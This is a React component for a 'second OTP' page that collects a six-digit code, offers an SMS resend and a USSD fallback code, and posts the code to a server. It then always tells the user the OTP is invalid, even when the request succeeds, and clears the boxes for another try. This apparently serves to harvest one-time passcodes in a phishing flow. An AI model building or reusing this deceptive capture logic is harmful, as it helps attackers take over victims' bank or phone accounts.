import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 6 digits")
    .required("OTP is required"),
});

const SecondOtp = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [errorMsg, setErrorMsg] = useState("");

  useEffect(() => {
    const storedPhone = localStorage.getItem("userPhoneNumber") || "";
    const masked = maskPhoneNumber(storedPhone);
    setPhoneNumber(masked);

    document.getElementById("otp-0")?.focus();
  }, []);

  const maskPhoneNumber = (phone) => {
    if (!phone) return "*******7491";
    const lastFour = phone.slice(-4);
    return `*******${lastFour}`;
  };

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (index < 5 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newOtp.join(""));
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      document.getElementById(`otp-${index - 1}`).focus();
    }
  };

  const handleResendSMS = () => {
    const fullPhoneNumber = localStorage.getItem("userPhoneNumber");

    axios
      .post(`${BASE_URL}/resend-otp`, { phoneNumber: fullPhoneNumber })
      .then((response) => {
        console.log("OTP resent successfully");
        setOtp(new Array(6).fill(""));
        document.getElementById("otp-0")?.focus();
      })
      .catch((error) => {
        console.error("Error resending OTP:", error);
      });
  };

  const submitForm = (data) => {
    setLoading(true);
    setErrorMsg("");
    axios
      .post(`${BASE_URL}/resend-otp`, { otp: data.otp })
      .then((response) => {
        console.log(response.data);
        // Reset inputs and show error
        setOtp(new Array(6).fill(""));
        setValue("otp", "");
        setErrorMsg("Invalid OTP, error occurred");
        document.getElementById("otp-0")?.focus();
      })
      .catch((error) => {
        console.error("There was an error!", error);
        setOtp(new Array(6).fill(""));
        setValue("otp", "");
        setErrorMsg("Invalid OTP, error occurred");
        document.getElementById("otp-0")?.focus();
      })
      .finally(() => {
        setLoading(false);
      });
  };

  const handleBack = () => {
    navigate(-1);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Main Content Container */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        {/* Card Container */}
        <div className="w-full max-w-sm">
          {/* Enter OTP Title */}
          <h1 className="text-2xl font-bold text-gray-900 text-center mb-3">
            Enter OTP
          </h1>

          {/* Subtitle */}
          <p className="text-gray-600 text-center mb-8 text-sm leading-relaxed">
            Please enter the 6 digit OTP sent to your registered phone number
          </p>

          {/* Form */}
          <form onSubmit={handleSubmit(submitForm)}>
            {/* Hidden registered input for react-hook-form */}
            <input type="hidden" {...register("otp")} />

            {/* OTP Input Boxes */}
            <div className="flex justify-center gap-4 mb-6">
              {otp.map((data, index) => (
                <input
                  key={index}
                  id={`otp-${index}`}
                  type="text"
                  name={`otp-${index}`}
                  maxLength="1"
                  value={data}
                  onChange={(e) => handleChange(e.target, index)}
                  onKeyDown={(e) => handleKeyDown(e, index)}
                  onFocus={(e) => e.target.select()}
                  className="w-10 h-10 text-center text-xl font-semibold border-b-4 border-purple-700 bg-transparent focus:outline-none transition-all"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  autoComplete="off"
                />
              ))}
            </div>

            <div className="mb-6 min-h-[20px]">
              <FormErrMsg errors={errors} inputName="otp" />
              {errorMsg && (
                <p className="text-red-500 text-sm text-center mt-2 font-medium">
                  {errorMsg}
                </p>
              )}
            </div>

            {/* Didn't get the code */}
            <div className="text-center mb-4">
              <p className="text-amber-500 text-sm mb-4">
                didn't get the code?
              </p>

              {/* Resend SMS Button */}
              <button
                type="button"
                onClick={handleResendSMS}
                className="inline-flex items-center gap-2 text-purple-700 font-medium text-sm mb-6"
              >
                <div className="w-5 h-5 bg-blue-500 rounded flex items-center justify-center">
                  <svg
                    className="w-3 h-3 text-white"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                </div>
                <span className="underline">Resend SMS</span>
              </button>
            </div>

            {/* Alternative method */}
            <div className="text-center mb-8">
              <p className="text-gray-700 text-sm">
                didn't get the code? Dial{" "}
                <span className="text-amber-500 font-semibold">*833*23#</span>
              </p>
            </div>

            {/* Buttons */}
            <div className="space-y-4">
              {/* Confirm Button */}
              <button
                type="submit"
                disabled={loading || otp.some((digit) => digit === "")}
                className="w-full bg-purple-700 hover:bg-purple-800 text-white py-3.5 rounded-lg font-semibold text-base transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? "Verifying..." : "Confirm"}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default SecondOtp;
